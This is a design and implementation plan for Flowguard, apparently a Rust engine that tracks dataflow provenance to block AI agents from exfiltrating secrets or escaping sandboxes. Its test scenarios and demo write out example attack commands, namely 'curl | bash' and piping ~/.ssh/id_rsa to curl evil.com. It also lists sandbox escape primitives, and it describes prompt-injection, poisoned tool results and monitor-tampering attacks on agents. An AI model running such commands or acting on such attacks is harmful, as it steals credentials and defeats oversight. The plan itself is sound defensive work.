# Flowguard Implementation Plan

## Core Direction

Build Flowguard as its own provenance-aware enforcement engine for sandboxed agent execution.

Do not fork Falco. Falco is strong prior art for syscall telemetry and rule ideas, but Flowguard needs first-class provenance state: FD tables, append-only graph, label propagation, causal explanation paths, and dataflow-based blocking. Those are core engine responsibilities, not a thin rule layer.

Primary pipeline:

```text
agent launcher
-> confinement layer
-> event collector
-> event normalizer
-> runtime state
-> append-only provenance graph
-> label engine
-> policy engine
-> enforcement engine
-> explanation engine
```

The system must answer two questions:

- Should this action be allowed before it completes?
- If blocked or alerted, what exact source-to-sink path explains it?

Correctness priority:

- Missing flows are worse than overtainting.
- Blocking must happen at enforceable hooks, not after-the-fact alerts.
- Every provenance edge must correspond to an observed event.
- FD table resolution is authoritative.
- Every violation must include a reconstructable explanation path.

## Related Systems

Use these systems as reference points, not as architecture templates.

- Falco: mature syscall detection and rule taxonomy. Useful for event fields, suspicious behavior examples, and alert outputs. Not enough for provenance-first blocking.
- Tetragon: useful reference for eBPF-based runtime visibility and enforcement. Especially relevant for return-value override versus signal-based termination.
- KubeArmor: useful reference for LSM-backed policy enforcement over processes, files, and network behavior.
- Tracee: useful reference for eBPF event collection and security detections.
- AppArmor, SELinux, Landlock, seccomp: practical confinement and syscall/file-access control layers.
- gVisor and Firecracker: stronger sandbox substrates underneath Flowguard, not replacements for provenance.
- CamFlow, SPADE, PASS: provenance systems worth studying for graph collection, storage, and querying.
- AgentSentinel: closest agent-specific reference. Useful for computer-use-agent threat modeling, task-context-aware auditing, sensitive-operation suspension, and the BadComputerUse benchmark taxonomy. Flowguard should not copy its LLM-auditor-first design as the core decision path.

Design stance:

- Borrow telemetry ideas from Falco and Tracee.
- Borrow enforcement ideas from Tetragon, KubeArmor, Landlock, seccomp, and BPF-LSM.
- Borrow agent/task-context ideas and benchmark categories from AgentSentinel.
- Keep Flowguard's graph, labels, policy decisions, and explanations as our own Rust core.

## Flowguard Differentiation

Compared with AgentSentinel, Flowguard should be provenance-first rather than audit-first.

AgentSentinel is valuable because it protects computer-use agents in real time, suspends sensitive operations, and combines task context with system traces. The weakness for Flowguard's target is that an LLM-based auditor is still a nondeterministic decision component, and trace/task text can become part of the attack surface.

Flowguard's improvement path:

- deterministic core decisions from typed events, FD tables, provenance graph edges, labels, and explicit policy rules
- reconstructable source-to-sink explanations for every violation
- process identity based on PID plus start time, with full descendant tracking from the agent root
- structured traces that treat command strings, paths, and file contents as metadata, not trusted policy instructions
- approval and cache entries scoped by task id, process identity, sink object, policy id, label state, timestamp, and TTL
- scenario-first regression tests for every policy and bug fix
- optional LLM auditor only as a secondary triage layer, never as the only blocker for known dataflow policies

This makes Flowguard stronger for high-confidence rules such as `SECRET -> SEND`, `EXTERNAL -> EXEC`, and sandbox escape primitives. LLM review can still help for ambiguous cases, but the MVP must demonstrate deterministic blocking without it.

## Enforcement Model

Flowguard needs three enforcement planes.

### Static Confinement

Applied at agent launch before any provenance is known.

Block or restrict:

- namespace and mount changes: `setns`, `unshare`, `mount`, `pivot_root`, `chroot`
- privilege changes: `setuid`, `setgid`, `capset`, suspicious `prctl`
- process inspection/control: `ptrace`, dangerous `/proc/*` access
- kernel attack surface: `bpf`, `perf_event_open`, module loading
- host escape surfaces: `/var/run/docker.sock`, containerd sockets, host namespace handles, `/sys`, risky `/dev`

Possible mechanisms:

- seccomp filters
- seccomp user notification for brokered operations
- Landlock for unprivileged filesystem and network restrictions
- AppArmor or SELinux profiles
- BPF-LSM where available
- gVisor or Firecracker as stronger isolation substrate

### Dynamic Provenance Enforcement

Applied when a syscall/event depends on runtime dataflow state.

MVP policies:

- `EXTERNAL -> EXEC`: block or alert when network-derived data reaches execution.
- `SECRET -> SEND`: block when secret-derived data reaches network send.
- `PROMPT -> shell without APPROVED`: require approval for agent-driven shell/interpreter execution.
- `EXTERNAL -> executable write`: alert when external data writes to executable locations.

Additional sandbox policies:

- `PROMPT|EXTERNAL -> sandbox escape primitive`
- `PROMPT|EXTERNAL -> container runtime socket`
- `PROMPT|EXTERNAL -> persistence write`
- `SECRET -> process argument/env/log file`
- outbound network to non-allowlisted endpoints

### Approval Broker

Approval must be explicit, scoped, and explainable.

Approval scope should include:

- process identity: PID plus start time
- command or syscall family
- destination path or endpoint
- policy being waived
- timestamp and TTL

No global ambient approval.

## Engine Phases

### Phase 1: Synthetic Engine

Goal: deterministic correctness without kernel integration.

Implemented:

- Rust crate skeleton
- domain event model
- runtime process/FD/socket state
- append-only graph API
- label state with path witnesses
- policy decision API
- explanation path reconstruction
- `curl | bash` scenario: `EXTERNAL -> EXEC`
- `cat ~/.ssh/id_rsa | curl evil.com` scenario: `SECRET -> SEND`

Next work:

- add `CONNECT` graph edges
- add structured warnings for inconsistent state instead of panics
- add `Prompt -> Shell without approval`
- add `External -> executable write`
- add explicit config for secret paths, executable paths, interpreters, and endpoint allowlists

### Phase 2: Policy Completeness

Goal: cover the core agent threat model with synthetic scenarios.

Scenario set:

- `curl | bash` -> `EXTERNAL -> EXEC`
- `cat ~/.ssh/id_rsa | curl evil.com` -> `SECRET -> SEND`
- agent runs `bash -c ...` without approval -> `PROMPT -> shell`
- approval event allows one scoped shell action -> no violation
- downloaded script writes `/usr/local/bin/tool`, then executes -> external executable write and exec
- agent accesses Docker socket -> sandbox escape alert/block
- agent calls `setns` or `mount` -> sandbox escape block
- agent writes cron/systemd/shell rc/SSH config -> persistence alert/block
- dup/pipe/close chain across processes -> FD correctness
- missing FD, unknown process, PID reuse -> structured warning and continued operation
- malicious tool result poisons shell command -> `EXTERNAL -> EXEC`
- malicious execution environment exposes host/runtime socket -> sandbox escape block
- agent infrastructure attack tries to kill monitor or modify agent config -> infrastructure protection alert/block
- task-context attack attempts to justify secret exfiltration -> deterministic `SECRET -> SEND` still blocks

Policy behavior:

- deterministic decision
- one or more violations
- every violation includes sink event and source-to-sink explanation path
- blockable sinks are represented separately from alert-only sinks

### Phase 3: Live Telemetry

Goal: feed real syscall-level events into the same engine.

Collector options:

- eBPF tracepoints/kprobes for telemetry
- auditd as a fallback event source
- Falco/Tracee/Tetragon as optional external event sources

Normalizer requirements:

- convert raw events into Flowguard domain events
- preserve timestamp and event id
- resolve process identity as PID plus start time
- never guess FD mappings
- surface inconsistent state as warnings
- attach optional task/tool context without making it authoritative for dataflow correctness
- enrich network endpoints with DNS resolution history when available

### Phase 4: Real Blocking

Goal: prevent leaks and escapes in live agent sandboxes.

Start narrow:

- block `execve` for `EXTERNAL -> EXEC`
- block `sendmsg`/`sendto`/`write` to socket for `SECRET -> NETWORK`
- block `openat/openat2` for sensitive host paths
- block `mount`, `setns`, `unshare`, `ptrace`, `bpf`, `capset`
- block writes to persistence and executable locations

Mechanism order:

- use static seccomp/Landlock/AppArmor constraints first
- use seccomp user notification for brokered decisions where feasible
- use BPF-LSM for lower-level blocking where available
- use eBPF telemetry for observation and explanation, not as the only blocking layer

## Agent Context Model

Flowguard should add an optional context stream beside syscall events.

Context events:

- `TaskStart`: task id, user-visible task text hash, agent root process
- `ToolUseStart`: task id, tool id, process identity, command/argv metadata
- `ToolUseEnd`: task id, tool id, process identity, exit status
- `AgentMessage`: task id, message hash and direction, not full prompt text by default
- `ApprovalGranted`: scoped approval for one policy/action/sink
- `DeclassificationGranted`: explicit approved trust boundary that suppresses existing process `Secret` taint for future propagation

Rules:

- context can narrow explanations and approval scope
- context cannot create provenance edges by itself
- normal context metadata cannot override deterministic blocks such as `SECRET -> SEND`
- `DeclassificationGranted` is a separate explicit control event; it does not prove byte independence, and a later secret read re-taints the process
- full task text should be optional and treated as untrusted metadata

## Precision Track: DynamoRIO Tainted-Buffer POC

Goal: evaluate whether dynamic binary instrumentation can give Flowguard a higher-precision signal for `SECRET -> network` without becoming language-specific.

This is not the primary MVP enforcement path. The primary MVP remains syscall provenance plus runtime blocking. The DynamoRIO work is a precision experiment that should produce additional evidence for byte-derived leaks.

### Task

Build a minimal DynamoRIO client that tracks secret-derived bytes from file reads to network sends for one Linux process tree.

Initial target:

```text
drrun -c flowguard_dbi_client.so -- python3 fixtures/agents/python_secret_post.py
```

The client should:

- observe `open/openat` and identify configured secret paths
- observe successful `read` from a secret fd and mark the returned user buffer as `SECRET`
- instrument memory/register data movement enough to propagate `SECRET` through direct copies and common libc copy paths
- observe `send/sendto/sendmsg/write` to socket fds
- report `DefiniteSecretToNetwork` if the send buffer overlaps tainted bytes
- emit a normalized Flowguard event/report that can be correlated with the syscall provenance graph

### Scope

MVP scope:

- Linux container target only
- x86_64 first, AArch64 only after the first POC works
- one traced process plus direct child processes if DynamoRIO client inheritance is practical
- Python demo first, but no Python-specific hooks
- direct byte copy propagation first
- block by aborting/killing the process or returning a failing syscall if practical

Non-goals:

- full language-level semantics
- complete implicit-flow tracking
- cryptographic/semantic leakage detection
- high performance
- production hardening
- replacing FD-table-based syscall provenance

### Architecture

Keep the DBI component outside the Rust core initially.

Proposed layout:

```text
dbi/dynamorio-client/
  CMakeLists.txt
  src/client.cpp
  README.md

src/events/
  add optional high-confidence event kind later:
  DefiniteTaintedSend { process, fd, endpoint, taint_source, byte_count, at }
```

Flowguard integration should be one-way at first:

```text
DynamoRIO client JSONL
-> Flowguard import/replay
-> correlate with syscall graph by pid/start-time/fd/event time
```

Do not let the DBI client mutate the provenance graph directly. Every graph edge still comes from an observed event in the normal engine.

### Acceptance Criteria

The POC is useful only if it proves all of these:

- A Python script that reads `fixtures/home/.ssh/id_rsa` and sends the same bytes is reported as `DefiniteSecretToNetwork`.
- A Python script that reads the same secret but sends unrelated constant text does not produce the high-confidence DBI violation.
- The normal syscall provenance layer still reports the conservative `PossibleSecretToNetwork` case.
- The report includes secret source path, sink fd/endpoint when available, tainted byte count, process identity, and event timestamp.
- The test runs in Docker with one command and writes artifacts under `logs/`.

### Risks

- Dynamic binary instrumentation may be too slow for normal agent execution.
- Correct taint propagation across all instructions and optimized libc paths is a large project.
- JIT runtimes, native extensions, shared memory, mmap, and multi-process handoff can create blind spots.
- The DBI result should be treated as high-confidence when present, not as the only security boundary.

## Benchmark Strategy

The MVP should not start by integrating a large external benchmark. First prove Flowguard's core claim with small deterministic scenarios, then map selected external benchmark cases into Flowguard scenario files.

Benchmark order:

1. Flowguard-owned scenario suite
2. BadComputerUse-derived security slice
3. AgentDojo prompt-injection and exfiltration cases
4. AgentHazard long-horizon harmful-behavior cases
5. OSWorld benign regression subset

### Flowguard-Owned Scenarios

These are the acceptance tests for the engine itself.

Required MVP cases:

- `SECRET -> SEND`: fake SSH key or `.env` data reaches network send
- `EXTERNAL -> EXEC`: downloaded or received data reaches shell/script execution
- `PROMPT -> shell without APPROVED`: agent launches interpreter without scoped approval
- sandbox escape primitive: Docker socket, namespace switch, mount, ptrace, or BPF attempt
- Copy Fail-style boundary abuse: unusual kernel boundary event such as `AF_ALG`
- benign network send: public file or generated text reaches allowed endpoint
- benign shell with approval: scoped approval suppresses only the intended shell policy

Metrics:

- policy id is deterministic
- sink event is shown
- source-to-sink explanation path is reconstructable
- block happens at the sink that would complete the unsafe operation
- paired benign scenario is allowed

### BadComputerUse-Derived Slice

BadComputerUse is useful for comparing against AgentSentinel, but it should be sampled rather than fully integrated for MVP.

Convert 5-10 representative cases into `scenarios/*.yaml`:

- malicious tool result causes `curl | bash`
- agent reads `.ssh/id_rsa` and exfiltrates it
- agent reads `.env` or API key material and sends it externally
- malicious execution environment exposes a runtime socket
- agent infrastructure attack tries to kill or modify the monitor
- task-context attack attempts to justify secret exfiltration
- benign equivalent for each high-risk behavior where possible

Flowguard result should report:

- block/allow decision
- policy id
- sink event
- explanation path
- whether task/tool context was present but non-authoritative

### AgentDojo

AgentDojo is better for indirect prompt injection and malicious tool-output scenarios. Use it after the Flowguard-owned and BadComputerUse-derived cases pass.

Good candidates:

- untrusted email/document/web result asks agent to leak private data
- tool result changes intended command
- external observation causes unsafe file or network action

Flowguard value:

- the model may be tricked, but `SECRET -> SEND` and `EXTERNAL -> EXEC` still block from provenance state

### AgentHazard

AgentHazard is useful later for long-horizon composition where individual actions look locally acceptable. It is too large for the first MVP.

Use after task/tool context exists:

- multi-turn secret collection then exfiltration
- repeated benign-looking writes that create persistence
- accumulated context that leads to sandbox escape

### OSWorld

OSWorld is not a security benchmark, but it is useful for false-positive checks after live or live-ish integration.

Use a small benign subset to ensure Flowguard does not block normal desktop/agent workflows unless a policy-relevant dataflow occurs.

## Module Ownership

- `events`: observed domain events only
- `state`: process table, FD table, socket mappings, object resolution
- `graph`: append-only node and edge storage
- `labels`: seed labels, propagation rules, witness paths
- `policy`: deterministic rules and decisions
- `explain`: source-to-sink explanation reconstruction
- `enforce`: allow/alert/approval/block outcomes
- `scenarios`: deterministic event replay and scenario tests

Keep these responsibilities separate. `scenarios` may orchestrate but must not own business logic.

## Immediate Next Steps

1. Add `CONNECT` edge creation and tests.
2. Add the MVP Flowguard-owned benchmark scenarios as replay YAML files.
3. Add task/tool context events to the scenario format without affecting provenance correctness.
4. Add `Prompt -> Shell without approval` scenario and policy.
5. Convert 5-10 BadComputerUse-derived cases into Flowguard scenario YAML.
6. Replace replay panics with structured warnings while keeping tests strict.
7. Add config object for secret paths, interpreters, executable locations, blocked paths, and network allowlists.
8. Update `docs/design.md` to match this prevention-first architecture and AgentSentinel comparison.

## MVP Demo Plan

Goal: demonstrate Flowguard blocking an agent or application that tries to leak sensitive data over the network.

The demo should make the core value obvious:

- without Flowguard, the agent would send the secret
- with Flowguard, the `SEND` sink is blocked
- the block includes a reconstructable explanation path

### Demo Scenario

Use a controlled malicious-agent fixture.

Behavior:

- read fake secret file: `fixtures/home/.ssh/id_rsa`
- pass contents through a pipe or subprocess boundary
- send data to `evil.example:443`

Expected Flowguard decision:

```text
BLOCK SecretToNetwork
```

Expected explanation:

```text
file:/home/user/.ssh/id_rsa --READ--> proc:cat
proc:cat --WRITE--> pipe:2
pipe:2 --READ--> proc:curl
proc:curl --SEND--> endpoint:evil.example:443
```

### Replayable Scenario Files

Add scenario files under `scenarios/`.

First scenario:

```text
scenarios/secret_exfil.yaml
```

It should encode ordered observed events:

- `AgentLaunch`
- `Pipe`
- `Fork`
- `Dup`
- `Open`
- `Read`
- `Write`
- `Read`
- `Connect`
- `Send`

Reason: scenario files make demos easier to inspect, modify, and explain than hard-coded Rust fixtures.

### CLI Demo

Add a CLI binary:

```text
cargo run -- replay scenarios/secret_exfil.yaml
```

Minimum output:

```text
BLOCK SecretToNetwork

sink:
  SEND proc:curl -> endpoint:evil.example:443

why:
  file:/home/user/.ssh/id_rsa --READ--> proc:cat
  proc:cat --WRITE--> pipe:2
  pipe:2 --READ--> proc:curl
  proc:curl --SEND--> endpoint:evil.example:443
```

CLI requirements:

- parse scenario file
- replay through existing engine
- print decision
- print sink event
- print explanation path
- exit nonzero on `Block`

### Allow/Block Comparison

Add two demo modes:

```text
cargo run -- replay scenarios/secret_exfil.yaml --mode observe
cargo run -- replay scenarios/secret_exfil.yaml --mode enforce
```

Expected behavior:

- `observe`: reports that `SECRET -> NETWORK` would be blocked
- `enforce`: marks the `SEND` event as blocked

This demonstrates the difference between passive detection and prevention.

### Live-ish Wrapper

After replay CLI works, add a small controlled wrapper:

```text
cargo run -- demo secret-exfil
```

The wrapper can launch a demo process or simulate wrapper-emitted events. It does not need eBPF yet.

Purpose:

- make the demo feel closer to a real agent
- keep Phase 1 deterministic
- avoid kernel integration before provenance and explanation are stable

### MVP Acceptance Criteria

- `cargo test` passes
- `cargo run -- replay scenarios/secret_exfil.yaml` prints a block
- output includes policy name, sink event, and full source-to-sink path
- a benign scenario that sends non-secret data is allowed
- demo can be explained in under one minute
